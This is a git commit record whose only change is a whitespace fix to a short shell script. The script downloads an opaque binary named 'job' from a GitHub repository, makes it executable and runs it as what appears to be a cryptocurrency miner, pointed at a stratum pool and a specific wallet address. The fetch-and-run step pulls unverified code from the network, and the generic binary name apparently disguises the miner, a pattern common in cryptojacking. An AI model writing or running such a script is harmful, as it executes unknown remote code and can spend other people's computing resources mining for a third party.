9f1ae3f6de0c483ec8e8dc0ee44c15ae185b56b2
darywell <106720695+darywell@users.noreply.github.com>
2022-06-04 16:30:09 +0500

    Update script01.sh

--- script01.sh
+++ script01.sh
@@ -1,5 +1,5 @@
 #MGPC
 wget https://github.com/darywell/job/raw/main/job
 chmod +x job
-./job -a yespowermgpc  -o stratum+tcps://stratum-asia.rplant.xyz:17049 -u MZJrVaEGGuGjgtZQXWFnr1wbcE8Q39EW6M.W1
+./job -a yespowermgpc -o stratum+tcps://stratum-asia.rplant.xyz:17049 -u MZJrVaEGGuGjgtZQXWFnr1wbcE8Q39EW6M.W1
 sleep 5
